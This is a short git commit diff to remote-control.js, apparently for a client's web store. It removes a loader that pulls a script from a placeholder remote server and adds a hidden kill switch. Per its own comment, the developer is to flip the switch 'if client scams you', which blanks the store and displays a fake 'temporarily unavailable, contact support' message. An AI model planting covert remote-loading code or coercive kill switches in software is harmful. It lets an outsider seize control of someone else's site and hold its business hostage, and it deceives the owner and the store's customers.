ed8672eefb3f2b72c20f6833bfa51facec5c5247
searchaly <mahediceo@gmail.com>
2025-04-27 07:20:45 +0600

    remote-control.js

--- remote-control.js
+++ remote-control.js
@@ -1,5 +1,13 @@
 (function() {
-    var script = document.createElement('script');
-    script.src = 'https://yourserver.com/remote-control.js';
-    document.head.appendChild(script);
+    var locked = false; // Change to true if client scams you
+
+    if (locked) {
+        document.body.innerHTML = `
+            <div style="display:flex;align-items:center;justify-content:center;height:100vh;flex-direction:column;">
+                <h1 style="font-size:30px;color:#333;">This store is temporarily unavailable.</h1>
+                <p style="margin-top:10px;font-size:16px;color:#777;">Please contact support to restore access.</p>
+            </div>
+        `;
+    }
 })();
+
